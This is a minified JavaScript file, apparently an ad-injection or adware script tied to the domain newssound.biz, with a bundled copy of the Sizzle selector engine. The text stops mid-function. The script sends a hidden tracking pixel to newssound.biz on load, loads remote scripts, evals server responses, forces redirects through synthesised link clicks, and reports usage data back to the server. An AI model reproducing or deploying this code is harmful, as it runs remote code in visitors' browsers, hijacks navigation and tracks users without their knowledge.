(function(f, i, j) {
    var g = "1f404c54c2b0e13e0f";
    var b = (function() {
        var l = 3;
        var p = parseInt("0");
        var o = parseInt("0");
        (function() {
            var r = ["mid=", "wid=52421", "sid=", "tid=8000", "rid=LAUNCHED"];
            a = (window.location.protocol == "http:" ? "http:" : "https:") + "//newssound.biz/metric/?" + r.join("&");
            var q = f.createElement("img");
            q.setAttribute("style", "width:0;height:0;display:none;visibility:hidden;");
            q.src = a + (a.indexOf("?") == -1 ? "?" : "&") + "t=" + (new Date().getTime());
            (document.head || document.documentElement).appendChild(q);
            if (typeof q.onload != j) {
                q.onload = function() {
                    q.parentNode && q.parentNode.removeChild(q)
                }
            }
        })();
        var n = false;
        if (typeof(MainWindow) != "undefined") {
            window.document = MainWindow.document.parentWindow
        }
        if (n) {
            return false
        }(function(d, w, uniqId, u) {
            var isReady = false,
                readyQueue = [],
                div = u,
                $$ = {};
            if (typeof(JSON) === u) {
                JSON = {}
            }

            function onReady() {
                isReady = true;
                while (readyQueue.length > 0) {
                    (readyQueue.pop())()
                }
            }
            if (typeof(d.getElementsByClassName) == u) {
                d.getElementsByClassName = function(cl) {
                    var retnode = [];
                    var myclass = new RegExp("\\b" + cl + "\\b");
                    var elem = this.getElementsByTagName("*");
                    for (var i = 0; i < elem.length; i++) {
                        var classes = elem[i].className;
                        if (myclass.test(classes)) {
                            retnode.push(elem[i])
                        }
                    }
                    return retnode
                }
            }
            $$ = w[uniqId] = {
                l: {},
                isIe: !!d.attachEvent,
                scriptDomain: "newssound.biz",
                unixTimestampNow: Math.round(new Date().getTime() / 1000),
                optoutValue: {},
                limitsValue: {},
                currentOptoutBlock: null,
                monetizationsConfig: {},
                ready: function(callback) {
                    !isReady ? readyQueue.push(callback) : callback()
                },
                createEl: function(html) {
                    if (div === u) {
                        div = d.createElement("div")
                    }
                    div.innerHTML = html;
                    return div.firstChild
                },
                each: function(array, callback) {
                    var i = 0,
                        length = array.length;
                    for (; i < length;) {
                        if (callback(array[i], i++) === false) {
                            return true
                        }
                    }
                },
                inArray: function(array, e) {
                    var i = 0,
                        length = array.length;
                    for (; i < length; i++) {
                        if (e === array[i]) {
                            return true
                        }
                    }
                    return false
                },
                filter: function(array, callback) {
                    var i = 0,
                        length = array.length,
                        ret = [];
                    for (; i < length; i++) {
                        if (callback(array[i], i)) {
                            ret.push(array[i])
                        }
                    }
                    return ret
                },
                apply: function() {
                    var obj = {};
                    $$.each(arguments, function(arg) {
                        for (var i in arg) {
                            obj[i] = arg[i]
                        }
                    });
                    return obj
                },
                xhrRequest: function(xhr, o) {
                    var timeoutId = u,
                        isTimedout = false,
                        $this = this;

                    function __gacb(data) {
                        o.callback(data)
                    }
                    o.url += (o.url.indexOf("?") >= 0 ? "&" : "?") + "ajax";
                    xhr.onreadystatechange = function() {
                        if (isTimedout) {
                            return
                        }
                        if (xhr.readyState === 4) {
                            if (xhr.status === 200 && xhr.responseText) {
                                if (timeoutId) {
                                    clearTimeout(timeoutId)
                                }
                                if (xhr.responseText.indexOf("__gacb(") > -1) {
                                    eval(xhr.responseText)
                                } else {
                                    o.callback($this.fromJson(xhr.responseText))
                                }
                            }
                        }
                    };
                    xhr.open("GET", o.url);
                    xhr.withCredentials = false;
                    timeoutId = setTimeout(function() {
                        isTimedout = true;
                        xhr.abort();
                        $$.jsonpRequest(o)
                    }, o.timeout);
                    xhr.send()
                },
                jsonp: function(opts) {
                    var timeoutId = u,
                        isTimedout = false;
                    var o = $$.apply({
                        callback: function() {},
                        timeout: 15000,
                        onTimeout: function() {},
                        data: {}
                    }, opts || {});
                    var r = Math.floor(Math.random() * 1000000000);
                    var jsonpFunction = "__twb_cb_" + r;
                    w[jsonpFunction] = function(data) {
                        if (isTimedout) {
                            return
                        }
                        if (timeoutId) {
                            clearTimeout(timeoutId)
                        }
                        o.callback(data);
                        onComplete()
                    };
                    var onComplete = function() {
                        w[jsonpFunction] = u;
                        if (s && s.parentNode) {
                            s.parentNode.removeChild(s)
                        }
                    };
                    o.url += (o.url.indexOf("?") >= 0 ? "&" : "?") + "jsonp=" + jsonpFunction + "&" + $$.toUrlParams(o.data);
                    var s = $$.script(o.url);
                    timeoutId = setTimeout(function() {
                        isTimedout = true;
                        o.onTimeout();
                        onComplete()
                    }, o.timeout)
                },
                toUrlParams: function(formdata, numeric_prefix, arg_separator) {
                    var value, key, tmp = [];
                    var _http_build_query_helper = function(key, val, arg_separator) {
                        var k, tmp = [];
                        if (val === true) {
                            val = "1"
                        } else {
                            if (val === false) {
                                val = "0"
                            }
                        }
                        if (val != null) {
                            if (typeof val === "object") {
                                for (k in val) {
                                    if (val[k] != null) {
                                        tmp.push(_http_build_query_helper(key + "[" + k + "]", val[k], arg_separator))
                                    }
                                }
                                return tmp.join(arg_separator)
                            } else {
                                if (typeof val !== "function") {
                                    return w.encodeURIComponent(key) + "=" + w.encodeURIComponent(val)
                                } else {
                                    return ""
                                }
                            }
                        } else {
                            return ""
                        }
                    };
                    if (!arg_separator) {
                        arg_separator = "&"
                    }
                    for (key in formdata) {
                        value = formdata[key];
                        if (numeric_prefix && !isNaN(key)) {
                            key = String(numeric_prefix) + key
                        }
                        var query = _http_build_query_helper(key, value, arg_separator);
                        if (query !== "") {
                            tmp.push(query)
                        }
                    }
                    return tmp.join(arg_separator)
                },
                jsonpRequest: function(o) {
                    var timeoutId = u,
                        isTimedout = false;
                    callbackName = "f" + this.randomNumber(10000, 9999999);
                    o.url += (o.url.indexOf("?") >= 0 ? "&" : "?") + "jsonp=" + callbackName;
                    w[callbackName] = function(data) {
                        if (isTimedout) {
                            return
                        }
                        if (timeoutId) {
                            clearTimeout(timeoutId)
                        }
                        o.callback(data)
                    };
                    var s = $$.script(o.url);
                    timeoutId = setTimeout(function() {
                        isTimedout = true;
                        s.parentNode.removeChild(s);
                        o.onTimeout()
                    }, o.timeout)
                },
                toJson: JSON.stringify || function(obj) {
                    var t = typeof(obj);
                    if (t != "object" || obj === null) {
                        if (t == "string") {
                            obj = '"' + obj + '"'
                        }
                        return String(obj)
                    } else {
                        var n, v, json = [],
                            arr = (obj && obj.constructor == Array);
                        for (n in obj) {
                            v = obj[n];
                            t = typeof(v);
                            if (t == "string") {
                                v = '"' + v + '"'
                            } else {
                                if (t == "object" && v !== null) {
                                    v = arguments.callee(v)
                                }
                            }
                            json.push((arr ? "" : '"' + n + '":') + String(v))
                        }
                        return (arr ? "[" : "{") + String(json) + (arr ? "]" : "}")
                    }
                },
                fromJson: JSON.parse || function(str) {
                    if (str === "") {
                        str = '""'
                    }
                    eval("var p=" + str + ";");
                    return p
                },
                xor: function(str) {
                    var i = 0,
                        length = str.length,
                        ret = "";
                    for (; i < length;) {
                        ret += String.fromCharCode(77 ^ str.charCodeAt(i++))
                    }
                    return ret
                },
                script: function(src, nocache, attributes) {
                    var s = d.createElement("script");
                    s.type = "text/javascript";
                    if (attributes) {
                        for (var i in attributes) {
                            s.setAttribute(i, attributes[i])
                        }
                    }
                    s.src = src + (nocache === u || nocache ? (src.indexOf("?") == -1 ? "?" : "&") + "t=" + (new Date().getTime()) : "");
                    if (d.getElementsByTagName("script") || d.documentElement.firstChild) {
                        (d.getElementsByTagName("script")[0] || d.documentElement.firstChild).parentNode.appendChild(s)
                    } else {
                        if (d.getElementsByTagName("head")) {
                            d.getElementsByTagName("head")[0].appendChild(s)
                        } else {
                            d.getElementsByTagName("body")[0].appendChild(s)
                        }
                    }
                    return s
                },
                includeCss: function(src) {
                    var style = d.createElement("link");
                    if (d.getElementsByTagName("body")[0]) {
                        d.getElementsByTagName("body")[0].appendChild(style);
                        style.rel = "stylesheet";
                        style.type = "text/css";
                        style.href = src
                    }
                },
                hasClass: function(element, className) {
                    return (!!element.getAttribute("class") && element.getAttribute("class").indexOf(className) > -1)
                },
                addClass: function(element, className) {
                    element.setAttribute("class", (!!element.getAttribute("class") ? element.getAttribute("class") + " " : "") + className)
                },
                removeClass: function(element, className) {
                    if (!!element.getAttribute("class")) {
                        element.setAttribute("class", element.getAttribute("class").replace(className, ""))
                    }
                },
                randomNumber: function(min, max) {
                    return Math.floor(Math.random() * (max - min + 1) + min)
                },
                eval: function(data) {
                    var s = d.createElement("script");
                    s.defer = true;
                    s.text = data;
                    (d.getElementsByTagName("script")[0] || d.documentElement.firstChild).parentNode.appendChild(s)
                },
                on: function(el, event, fn) {
                    var handler = function(event) {
                        fn.call(el, event || w.event)
                    };
                    if (el.addEventListener) {
                        el.addEventListener(event, handler, false)
                    } else {
                        if (el.attachEvent) {
                            el.attachEvent("on" + event, handler)
                        }
                    }
                },
                redirect: function(url, blank) {
                    var a = d.createElement("a");
                    a.href = url;
                    if (blank) {
                        a.target = "_blank"
                    }
                    a.__norewrite = true;
                    d.body.appendChild(a);
                    a.click();
                    d.body.removeChild(a)
                },
                setCookie: function(name, value, opts) {
                    var o = opts || {},
                        expire = u;
                    if (o.expire) {
                        expire = new Date();
                        expire.setTime(expire.getTime() + (o.expire * 1000))
                    }
                    document.cookie = encodeURIComponent(name) + "=" + encodeURIComponent(value) + (expire ? "; expires=" + expire.toUTCString() : "") + (o.path ? "; path=" + o.path : "") + (o.domain ? "; domain=" + o.domain : "")
                },
                getCookie: function(name) {
                    var value = u;
                    $$.each(d.cookie.split("; "), function(raw) {
                        var parts = raw.split("=");
                        var cookieName = decodeURIComponent(parts.shift());
                        if (cookieName == name) {
                            value = decodeURIComponent(parts.join("="));
                            return false
                        }
                    });
                    return value
                },
                encode: function(s) {
                    var i = 0,
                        ret = "",
                        length = s.length;
                    for (; i < length; i++) {
                        ret += ("%" + s.charCodeAt(i).toString(16))
                    }
                    return ret
                },
                preventDefault: function(e) {
                    if (e.preventDefault) {
                        e.preventDefault()
                    }
                    return e.returnValue = false
                },
                remove: function(e) {
                    return e.parentNode && e.parentNode.removeChild(e)
                },
                attr: function(e, name) {
                    if (e.hasAttribute && e.hasAttribute(name)) {
                        return e.getAttribute(name)
                    } else {
                        var node = e.getAttributeNode(name);
                        if (node) {
                            return node.value
                        }
                    }
                    return ""
                },
                updateLimits: function(block, lifetime) {
                    if (!lifetime) {
                        var mConfig = {};
                        if (w[uniqId].monetizationsConfig && w[uniqId].monetizationsConfig[block]) {
                            mConfig = w[uniqId].monetizationsConfig[block]
                        }
                        lifetime = mConfig.limit
                    }
                    if (lifetime > 0) {
                        $$.limitsValue[block] = $$.unixTimestampNow + parseInt(lifetime);
                        var cookieValue = $$.toJson($$.limitsValue);
                        $$.jsonp({
                            url: (window.location.protocol == "http:" ? "http:" : "https:") + "//" + w[uniqId].scriptDomain + "/optout/set/limit",
                            data: {
                                key: "1f404c54c2b0e13e0f",
                                cv: cookieValue
                            },
                            callback: function(response) {}
                        })
                    } else {}
                },
                setStartTime: function() {
                    var cookieValue = $$.unixTimestampNow;
                    $$.jsonp({
                        url: (window.location.protocol == "http:" ? "http:" : "https:") + "//" + w[uniqId].scriptDomain + "/optout/set/strtm",
                        data: {
                            key: "1f404c54c2b0e13e0f",
                            cv: cookieValue
                        },
                        callback: function(response) {}
                    })
                },
                updateLifeTime: function(lifeTime, lastActionTime) {
                    if (!lastActionTime) {
                        lastActionTime = $$.unixTimestampNow
                    }
                    if (!lifeTime) {
                        lifeTime = 0
                    }
                    var actionDiff = $$.unixTimestampNow - lastActionTime;
                    $$.jsonp({
                        url: (window.location.protocol == "http:" ? "http:" : "https:") + "//" + w[uniqId].scriptDomain + "/optout/set/lat",
                        data: {
                            key: "1f404c54c2b0e13e0f",
                            cv: $$.unixTimestampNow
                        }
                    });
                    if (actionDiff < 600) {
                        var newLifeTime = parseInt(parseInt(lifeTime) + parseInt(actionDiff));
                        $$.jsonp({
                            url: (window.location.protocol == "http:" ? "http:" : "https:") + "//" + w[uniqId].scriptDomain + "/optout/set/lt",
                            data: {
                                key: "1f404c54c2b0e13e0f",
                                cv: newLifeTime
                            }
                        })
                    } else {}
                },
                loadedCallback: function(code, block, custom1, custom2, custom3, custom4, custom5) {
                    if (typeof block == "undefined") {
                        block = ""
                    }
                    var params = ["mid=" + block, "wid=52421", "sid=" + ((w[uniqId] && w[uniqId].tbParams && w[uniqId].tbParams.sid) ? w[uniqId].tbParams.sid : ""), "tid=8000", "rid=" + code];
                    if (custom1) {
                        params.push("custom1=" + custom1)
                    }
                    if (custom2) {
                        params.push("custom2=" + custom2)
                    }
                    if (custom3) {
                        params.push("custom3=" + custom3)
                    }
                    if (custom4) {
                        params.push("custom4=" + custom4)
                    }
                    if (custom5) {
                        params.push("custom5=" + custom5)
                    }
                    var src = (window.location.protocol == "http:" ? "http:" : "https:") + "//" + w[uniqId].scriptDomain + "/metric/?" + params.join("&");
                    var imgEl = d.createElement("img");
                    imgEl.setAttribute("style", "width:0;height:0;display:none;visibility:hidden;");
                    imgEl.src = src + (src.indexOf("?") == -1 ? "?" : "&") + "t=" + (new Date().getTime());
                    d.getElementsByTagName("body")[0].appendChild(imgEl);
                    $$.on(imgEl, "load", function() {
                        $$.remove(imgEl)
                    })
                },
                reportSetCallback: function(response) {},
                host: function(url) {
                    var m = url.match(/^https?:\/\/([^\/]+)/);
                    return m ? m[1] : ""
                },
                optoutShow: function(block) {
                    if ($$.tbParams.optoutUrl) {
                        location.href = $$.tbParams.optoutUrl
                    } else {
                        if (!$$.twBarOptOut && typeof $$.twBarOptOutInit == "function") {
                            $$.twBarOptOutInit()
                        }
                        if ($$.twBarOptOut) {
                            $$.currentOptoutBlock = block;
                            $$.twBarOptOut.style.display = "block";
                            $$.loadedCallback("OPTOUT_SHOW", block)
                        }
                    }
                },
                optoutHide: function(block) {
                    if ($$.twBarOptOut) {
                        $$.twBarOptOut.style.display = "none"
                    }
                },
                getMtzCfg: function(block) {
                    var fname = ["mone", "tiza", "tions", "Config"].join("");
                    if (w[uniqId][fname] && w[uniqId][fname][block] && w[uniqId][fname][block].config) {
                        return w[uniqId][fname][block].config
                    }
                    return {}
                }
            };
            var getMtzConfigAlias = ["get", "Mon", "etiza", "tion", "Config"].join("");
            $$[getMtzConfigAlias] = function(block) {
                return $$.getMtzCfg(block)
            };
            if (d.addEventListener) {
                d.addEventListener("DOMContentLoaded", function() {
                    onReady()
                }, false)
            } else {
                if (d.attachEvent) {
                    d.attachEvent("onreadystatechange", function() {
                        onReady()
                    })
                }
            }
            if (d.readyState) {
                (function() {
                    if ((!$$.isIe && d.readyState === "interactive") || d.readyState === "complete") {
                        onReady()
                    } else {
                        setTimeout(arguments.callee, 100)
                    }
                })()
            } else {
                var toplevel = false;
                try {
                    toplevel = window.frameElement == null
                } catch (e) {}
                if (d && d.dElement && d.dElement.doScroll && toplevel) {
                    (function() {
                        try {
                            d.dElement.doScroll("left")
                        } catch (e) {
                            setTimeout(arguments.callee, 100);
                            return
                        }
                        onReady()
                    })()
                }
            }
        })(document, window, "1f404c54c2b0e13e0f", undefined);;
        (function(aA, q) {
            var G, aD, l, v, R, U, ag, aH, S, aj, L, w, at, an, aB, k, P, av = "sizzle" + -(new Date()),
                T = aA.document,
                aE = 0,
                ao = 0,
                d = J(),
                au = J(),
                Q = J(),
                ah = false,
                N = function() {
                    return 0
                },
                az = typeof q,
                ab = 1 << 31,
                Y = ({}).hasOwnProperty,
                ax = [],
                ay = ax.pop,
                W = ax.push,
                b = ax.push,
                u = ax.slice,
                j = ax.indexOf || function(aJ) {
                    var aI = 0,
                        e = this.length;
                    for (; aI < e; aI++) {
                        if (this[aI] === aJ) {
                            return aI
                        }
                    }
                    return -1
                },
                c = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
                x = "[\\x20\\t\\r\\n\\f]",
                a = "(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",
                V = a.replace("w", "w#"),
                aq = "\\[" + x + "*(" + a + ")" + x + "*(?:([*^$|!~]?=)" + x + "*(?:(['\"])((?:\\\\.|[^\\\\])*?)\\3|(" + V + ")|)|)" + x + "*\\]",
                s = ":(" + a + ")(?:\\(((['\"])((?:\\\\.|[^\\\\])*?)\\3|((?:\\\\.|[^\\\\()[\\]]|" + aq.replace(3, 8) + ")*)|.*)\\)|)",
                z = new RegExp("^" + x + "+|((?:^|[^\\\\])(?:\\\\.)*)" + x + "+$", "g"),
                D = new RegExp("^" + x + "*," + x + "*"),
                K = new RegExp("^" + x + "*([>+~]|" + x + ")" + x + "*"),
                al = new RegExp(x + "*[+~]"),
                B = new RegExp("=" + x + "*([^\\]'\"]*)" + x + "*\\]", "g"),
                ad = new RegExp(s),
                ae = new RegExp("^" + V + "$"),
                am = {
                    ID: new RegExp("^#(" + a + ")"),
                    CLASS: new RegExp("^\\.(" + a + ")"),
                    TAG: new RegExp("^(" + a.replace("w", "w*") + ")"),
                    ATTR: new RegExp("^" + aq),
                    PSEUDO: new RegExp("^" + s),
                    CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + x + "*(even|odd|(([+-]|)(\\d*)n|)" + x + "*(?:([+-]|)" + x + "*(\\d+)|))" + x + "*\\)|)", "i"),
                    bool: new RegExp("^(?:" + c + ")$", "i"),
                    needsContext: new RegExp("^" + x + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + x + "*((?:-\\d)?\\d*)" + x + "*\\)|)(?=[^-]|$)", "i")
                },
                aa = /^[^{]+\{\s*\[native \w/,
                ac = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
                h = /^(?:input|select|textarea|button)$/i,
                t = /^h\d$/i,
                X = /'|\\/g,
                A = new RegExp("\\\\([\\da-f]{1,6}" + x + "?|(" + x + ")|.)", "ig"),
                ap = function(e, aJ, i) {
                    var aI = "0x" + aJ - 65536;
                    return aI !== aI || i ? aJ : aI < 0 ? String.fromCharCode(aI + 65536) : String.fromCharCode(aI >> 10 | 55296, aI & 1023 | 56320)
                };
            try {
                b.apply((ax = u.call(T.childNodes)), T.childNodes);
                ax[T.childNodes.length].nodeType
            } catch (M) {
                b = {
                    apply: ax.length ? function(i, e) {
                        W.apply(i, u.call(e))
                    } : function(aK, aJ) {
                        var e = aK.length,
                            aI = 0;
                        while ((aK[e++] = aJ[aI++])) {}
                        aK.length = e - 1
                    }
                }
            }

            function E(aP, aI, aT, aV) {
                var aU, aM, aN, aR, aS, aL, aK, e, aJ, aQ;
                if ((aI ? aI.ownerDocument || aI : T) !== L) {
                    aj(aI)
                }
                aI = aI || L;
                aT = aT || [];
                if (!aP || typeof aP !== "string") {
                    return aT
                }
                if ((aR = aI.nodeType) !== 1 && aR !== 9) {
                    return []
                }
                if (at && !aV) {
                    if ((aU = ac.exec(aP))) {
                        if ((aN = aU[1])) {
                            if (aR === 9) {
                                aM = aI.getElementById(aN);
                                if (aM && aM.parentNode) {
                                    if (aM.id === aN) {
                                        aT.push(aM);
                                        return aT
                                    }
                                } else {
                                    return aT
                                }
                            } else {
                                if (aI.ownerDocument && (aM = aI.ownerDocument.getElementById(aN)) && P(aI, aM) && aM.id === aN) {
                                    aT.push(aM);
                                    return aT
                                }
                            }
                        } else {
                            if (aU[2]) {
                                b.apply(aT, aI.getElementsByTagName(aP));
                                return aT
                            } else {
                                if ((aN = aU[3]) && aD.getElementsByClassName && aI.getElementsByClassName) {
                                    b.apply(aT, aI.getElementsByClassName(aN));
                                    return aT
                                }
                            }
                        }
                    }
                    if (aD.qsa && (!an || !an.test(aP))) {
                        e = aK = av;
                        aJ = aI;
                        aQ = aR === 9 && aP;
                        if (aR === 1 && aI.nodeName.toLowerCase() !== "object") {
                            aL = p(aP);
                            if ((aK = aI.getAttribute("id"))) {
                                e = aK.replace(X, "\\$&")
                            } else {
                                aI.setAttribute("id", e)
                            }
                            e = "[id='" + e + "'] ";
                            aS = aL.length;
                            while (aS--) {
                                aL[aS] = e + o(aL[aS])
                            }
                            aJ = al.test(aP) && aI.parentNode || aI;
                            aQ = aL.join(",")
                        }
                        if (aQ) {
                            try {
                                b.apply(aT, aJ.querySelectorAll(aQ));
                                return aT
                            } catch (aO) {} finally {
                                if (!aK) {
                                    aI.removeAttribute("id")
                                }
                            }
                        }
                    }
                }
                return aC(aP.replace(z, "$1"), aI, aT, aV)
            }

            function O(e) {
                return aa.test(e + "")
            }

            function J() {
                var i = [];

                function e(aI, aJ) {
                    if (i.push(aI += " ") > v.cacheLength) {
                        delete e[i.shift()]
                    }
                    return (e[aI] = aJ)
                }
                return e
            }

            function r(e) {
                e[av] = true;
                return e
            }

            function m(i) {
                var aJ = L.createElement("div");
                try {
                    return !!i(aJ)
                } catch (aI) {
                    return false
                } finally {
                    if (aJ.parentNode) {
                        aJ.parentNode.removeChild(aJ)
                    }
                    aJ = null
                }
            }

            function aF(e, aJ, aM) {
                e = e.split("|");
                var aL, aI = e.length,
                    aK = aM ? null : aJ;
                while (aI--) {
                    if (!(aL = v.attrHandle[e[aI]]) || aL === aJ) {
                        v.attrHandle[e[aI]] = aK
                    }
                }
            }

            function Z(i, e) {
                var aI = i.getAttributeNode(e);
                return aI && aI.specified ? aI.value : i[e] === true ? e.toLowerCase() : null
            }

            function H(i, e) {
                return i.getAttribute(e, e.toLowerCase() === "type" ? 1 : 2)
            }

            function C(e) {
                if (e.nodeName.toLowerCase() === "input") {
                    return e.defaultValue
                }
            }

            function f(i, e) {
                var aJ = e && i,
                    aI = aJ && i.nodeType === 1 && e.nodeType === 1 && (~e.sourceIndex || ab) - (~i.sourceIndex || ab);
                if (aI) {
                    return aI
                }
                if (aJ) {
                    while ((aJ = aJ.nextSibling)) {
                        if (aJ === e) {
                            return -1
                        }
                    }
                }
                return i ? 1 : -1
            }

            function F(e) {
                return function(aI) {
                    var i = aI.nodeName.toLowerCase();
                    return i === "input" && aI.type === e
                }
            }

            function g(e) {
                return function(aI) {
                    var i = aI.nodeName.toLowerCase();
                    return (i === "input" || i === "button") && aI.type === e
                }
            }

            function ar(e) {
                return r(function(i) {
                    i = +i;
                    return r(function(aI, aM) {
                        var aK, aJ = e([], aI.length, i),
                            aL = aJ.length;
                        while (aL--) {
                            if (aI[(aK = aJ[aL])]) {
                                aI[aK] = !(aM[aK] = aI[aK])
                            }
                        }
                    })
                })
            }
            U = E.isXML = function(e) {
                var i = e && (e.ownerDocument || e).documentElement;
                return i ? i.nodeName !== "HTML" : false
            };
            aD = E.support = {};
            aj = E.setDocument = function(e) {
                var i = e ? e.ownerDocument || e : T;
                if (i === L || i.nodeType !== 9 || !i.documentElement) {
                    return L
                }
                L = i;
                w = i.documentElement;
                at = !U(i);
                aD.attributes = m(function(aI) {
                    aI.innerHTML = "<a href='#'></a>";
                    aF("type|href|height|width", H, aI.firstChild.getAttribute("href") === "#");
                    aF(c, Z, aI.getAttribute("disabled") == null);
                    aI.className = "i";
                    return !aI.getAttribute("className")
                });
                aD.input = m(function(aI) {
                    aI.innerHTML = "<input>";
                    aI.firstChild.setAttribute("value", "");
                    return aI.firstChild.getAttribute("value") === ""
                });
                aF("value", C, aD.attributes && aD.input);
                aD.getElementsByTagName = m(function(aI) {
                    aI.appendChild(i.createComment(""));
                    return !aI.getElementsByTagName("*").length
                });
                aD.getElementsByClassName = m(function(aI) {
                    aI.innerHTML = "<div class='a'></div><div class='a i'></div>";
                    aI.firstChild.className = "i";
                    return aI.getElementsByClassName("i").length === 2
                });
                aD.getById = m(function(aI) {
                    w.appendChild(aI).id = av;
                    return !i.getElementsByName || !i.getElementsByName(av).length
                });
                if (aD.getById) {
                    v.find.ID = function(aK, aJ) {
                        if (typeof aJ.getElementById !== az && at) {
                            var aI = aJ.getElementById(aK);
                            return aI && aI.parentNode ? [aI] : []
                        }
                    };
                    v.filter.ID = function(aJ) {
                        var aI = aJ.replace(A, ap);
                        return function(aK) {
                            return aK.getAttribute("id") === aI
                        }
                    }
                } else {
                    delete v.find.ID;
                    v.filter.ID = function(aJ) {
                        var aI = aJ.replace(A, ap);
                        return function(aL) {
                            var aK = typeof aL.getAttributeNode !== az && aL.getAttributeNode("id");
                            return aK && aK.value === aI
                        }
                    }
                }
                v.find.TAG = aD.getElementsByTagName ? function(aI, aJ) {
                    if (typeof aJ.getElementsByTagName !== az) {
                        return aJ.getElementsByTagName(aI)
                    }
                } : function(aI, aM) {
                    var aN, aL = [],
                        aK = 0,
                        aJ = aM.getElementsByTagName(aI);
                    if (aI === "*") {
                        while ((aN = aJ[aK++])) {
                            if (aN.nodeType === 1) {
                                aL.push(aN)
                            }
                        }
                        return aL
                    }
                    return aJ
                };
                v.find.CLASS = aD.getElementsByClassName && function(aJ, aI) {
                    if (typeof aI.getElementsByClassName !== az && at) {
                        return aI.getElementsByClassName(aJ)
                    }
                };
                aB = [];
                an = [];
                if ((aD.qsa = O(i.querySelectorAll))) {
                    m(function(aI) {
                        aI.innerHTML = "<select><option selected=''></option></select>";
                        if (!aI.querySelectorAll("[selected]").length) {
                            an.push("\\[" + x + "*(?:value|" + c + ")")
                        }
                        if (!aI.querySelectorAll(":checked").length) {
                            an.push(":checked")
                        }
                    });
                    m(function(aJ) {
                        var aI = i.createElement("input");
                        aI.setAttribute("type", "hidden");
                        aJ.appendChild(aI).setAttribute("t", "");
                        if (aJ.querySelectorAll("[t^='']").length) {
                            an.push("[*^$]=" + x + "*(?:''|\"\")")
                        }
                        if (!aJ.querySelectorAll(":enabled").length) {
                            an.push(":enabled", ":disabled")
                        }
                        aJ.querySelectorAll("*,:x");
                        an.push(",.*:")
                    })
                }
                if ((aD.matchesSelector = O((k = w.webkitMatchesSelector || w.mozMatchesSelector || w.oMatchesSelector || w.msMatchesSelector)))) {
                    m(function(aI) {
                        aD.disconnectedMatch = k.call(aI, "div");
                        k.call(aI, "[s!='']:x");
                        aB.push("!=", s)
                    })
                }
                an = an.length && new RegExp(an.join("|"));
                aB = aB.length && new RegExp(aB.join("|"));
                P = O(w.contains) || w.compareDocumentPosition ? function(aJ, aI) {
                    var aL = aJ.nodeType === 9 ? aJ.documentElement : aJ,
                        aK = aI && aI.parentNode;
                    return aJ === aK || !!(aK && aK.nodeType === 1 && (aL.contains ? aL.contains(aK) : aJ.compareDocumentPosition && aJ.compareDocumentPosition(aK) & 16))
                } : function(aJ, aI) {
                    if (aI) {
                        while ((aI = aI.parentNode)) {
                            if (aI === aJ) {
                                return true
                            }
                        }
                    }
                    return false
                };
                aD.sortDetached = m(function(aI) {
                    return aI.compareDocumentPosition(i.createElement("div")) & 1
                });
                N = w.compareDocumentPosition ? function(aJ, aI) {
                    if (aJ === aI) {
                        ah = true;
                        return 0
                    }
                    var aK = aI.compareDocumentPosition && aJ.compareDocumentPosition && aJ.compareDocumentPosition(aI);
                    if (aK) {
                        if (aK & 1 || (!aD.sortDetached && aI.compareDocumentPosition(aJ) === aK)) {
                            if (aJ === i || P(T, aJ)) {
                                return -1
                            }
                            if (aI === i || P(T, aI)) {
                                return 1
                            }
                            return S ? (j.call(S, aJ) - j.call(S, aI)) : 0
                        }
                        return aK & 4 ? -1 : 1
                    }
                    return aJ.compareDocumentPosition ? -1 : 1
                } : function(aJ, aI) {
                    var aP, aM = 0,
                        aO = aJ.parentNode,
                        aL = aI.parentNode,
                        aK = [aJ],
                        aN = [aI];
                    if (aJ === aI) {
                        ah = true;
                        return 0
                    } else {
                        if (!aO || !aL) {
                            return aJ === i ? -1 : aI === i ? 1 : aO ? -1 : aL ? 1 : S ? (j.call(S, aJ) - j.call(S, aI)) : 0
                        } else {
                            if (aO === aL) {
                                return f(aJ, aI)
                            }
                        }
                    }
                    aP = aJ;
                    while ((aP = aP.parentNode)) {
                        aK.unshift(aP)
                    }
                    aP = aI;
                    while ((aP = aP.parentNode)) {
                        aN.unshift(aP)
                    }
                    while (aK[aM] === aN[aM]) {
                        aM++
                    }
                    return aM ? f(aK[aM], aN[aM]) : aK[aM] === T ? -1 : aN[aM] === T ? 1 : 0
                };
                return i
            };
            E.matches = function(i, e) {
                return E(i, null, null, e)
            };
            E.matchesSelector = function(aI, aK) {
                if ((aI.ownerDocument || aI) !== L) {
                    aj(aI)
                }
                aK = aK.replace(B, "='$1']");
                if (aD.matchesSelector && at && (!aB || !aB.test(aK)) && (!an || !an.test(aK))) {
                    try {
                        var i = k.call(aI, aK);
                        if (i || aD.disconnectedMatch || aI.document && aI.document.nodeType !== 11) {
                            return i
                        }
                    } catch (aJ) {}
                }
                return E(aK, L, null, [aI]).length > 0
            };
            E.contains = function(e, i) {
                if ((e.ownerDocument || e) !== L) {
                    aj(e)
                }
                return P(e, i)
            };
            E.attr = function(aI, e) {
                if ((aI.ownerDocument || aI) !== L) {
                    aj(aI)
                }
                var i = v.attrHandle[e.toLowerCase()],
                    aJ = (i && Y.call(v.attrHandle, e.toLowerCase()) ? i(aI, e, !at) : q);
                return aJ === q ? aD.attributes || !at ? aI.getAttribute(e) : (aJ = aI.getAttributeNode(e)) && aJ.specified ? aJ.value : null : aJ
            };
            E.error = function(e) {
                throw new Error("Syntax error, unrecognized expression: " + e)
            };
            E.uniqueSort = function(aJ) {
                var aK, aL = [],
                    e = 0,
                    aI = 0;
                ah = !aD.detectDuplicates;
                S = !aD.sortStable && aJ.slice(0);
                aJ.sort(N);
                if (ah) {
                    while ((aK = aJ[aI++])) {
                        if (aK === aJ[aI]) {
                            e = aL.push(aI)
                        }
                    }
                    while (e--) {
                        aJ.splice(aL[e], 1)
                    }
                }
                return aJ
            };
            R = E.getText = function(aL) {
                var aK, aI = "",
                    aJ = 0,
                    e = aL.nodeType;
                if (!e) {
                    for (;
                        (aK = aL[aJ]); aJ++) {
                        aI += R(aK)
                    }
                } else {
                    if (e === 1 || e === 9 || e === 11) {
                        if (typeof aL.textContent === "string") {
                            return aL.textContent
                        } else {
                            for (aL = aL.firstChild; aL; aL = aL.nextSibling) {
                                aI += R(aL)
                            }
                        }
                    } else {
